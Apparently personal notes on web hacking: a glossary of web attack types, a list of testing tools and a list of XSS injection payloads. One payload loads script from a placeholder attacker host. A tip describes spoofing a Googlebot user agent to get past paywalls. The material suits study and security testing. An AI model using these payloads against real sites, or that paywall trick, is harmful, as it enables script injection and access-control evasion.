# Web Hacking

## Quick Tips

* [Index of all web client & server security topics](https://portswigger.net/web-security/all-topics)
* Where to look = source code (form input/hidden fields, directories & indexes), URL (parameters), cookie (-stored strings), _robots.txt_, _.htaccess_ & _.htpasswd_
* Access paywalled research papers = install a useragent switcher extension and set it to Googlebot (they let SEs read their content)
  * <https://www.reddit.com/r/reddit.com/comments/6o84t/who_else_is_sick_of_sites_hosting_research_papers/c04f3xz>

## Glossary

* **Clickjacking** = tricking user into clicking on something unintended (eg Facebook likejacking, where hidden button overlay induces a pagelike)
* **C/XSRF** (Cross-Site Request Forgery) = coerces a victim into browsing a legit page s/he's currently logged in via a specially crafted URL with parameters having an immediate effect
  * Caused by a lack of mechanisms to check the source of a request (URL referer or generated form token)
* **Directory Traversal** = abuses an input expecting eg a filename with a more elaborate parent hierarchy traversing path (to something interesting eg a filesystem index or password file)
* **File Inclusion** = abuses a page including another page (even PHP scripts) via its URL, loading/executing them with no boundaries/filters in place, bypassing same website policy
  * **Local** (LFI) = only local files are allowed, could still be used by files whose content can be maniplated by attacker (eg access logs)
  * **Remote File Inclusion** (RFI) = any remote file/page can be included (eg `index.php?page=http://www.google.com`, google them via `inurl:"index.php?page="`)
* **XSS** (Cross-Site Scripting) = abuses a legit page's lack of input (URL, form field) sanitization to insert a malicious (JS) script, accounts for 84% of all security vulnerabilities
  * **Persistent** = the script is saved and served back to the victim when she browses a page displaying unsanitized content (eg _MMQ_)
  * **Non-Persistent** = coerces a victim into browsing a volatile forged (**GET/POST**) URL holding payload as parameter which get displayed on a page without sanitization
    * Eg a (lousy) search engine results page: _You searched: `javascript:alert('oh no');`_

## Tools

* _Burp Suite Scanner_ (by _PortSwigger_) = web app vulnerability testing/scanning graphical tool, server-side vulnerabilities, Interactive Application Security Testing (IAST), web proxy, web app crawler
* _CeWL_ (Custom Word List generator) = crawls & extracts a website's keywords, to feed as contextal passwords fragments into a cracker
* `dirb` (directory buster) = scans all (potentially nonreferenced) files/pages on a website via a dictionary/wordlist
* _gobuster_ = scans all (potentially nonreferenced) files/pages on a website via a wordlist
* _IronWASP_ = open-source web app vulnerability testing/scanning, reports, extensible
* _OWASP Zap_ = web app security testing, AJAX Spidering, Fuzzing, REST APIs testing, active/passive scan, Filters, Anti-CSRF tokens, WebSocket testing, HTTP sessions, Spider

## Payloads

### XSS

Examples (different ways to bypass input sanitization):

```PHP
page.php?q="><script>alert('The Hacker News')</script>
page.php?q="><script>alert("The Hacker News")</script>
page.php?q="><script>alert("The Hacker News");</script>
page.php?q="><script>alert(/The Hacker News");</script>
page.php?q=//"><script>alert(/The Hacker News/);</script>
page.php?q=abc<script>alert(/The Hacker News/);</script>
page.php?q=abc"><script>alert(/The Hacker News/);</script>
page.php?q=abc"></script><script>alert(/The Hacker News/);</script>
page.php?q=abc//abc"></script>alert(/The Hacker News/);</script>
page.php?q=000"><script></script><script>alert(The Hacker News);</script>
page.php?q=000abc</script><script>alert(/The Hacker News/);</script>
page.php?q=--<script>"></script>alert(/The Hacker News/);</script>
page.php?q=pwned<script>document.write('The Hacker News');</script>
page.php?q=pwned</script><script>document.write(The Hacker News);</script>
page.php?q=pwned')alert(The Hacker News);//
page.php?q=pwned";)alert(The Hacker News);//
page.php?q=pwned");alert(/The Hacker News/);//
page.php?q=pwned//"></script><script>location.href='javascript:alert(/The Hacker News/);</script>
page.php?q="><img src='javascript:alert('The Hacker News');'>
page.php?q="><script src='http://malicous js'</script>
```
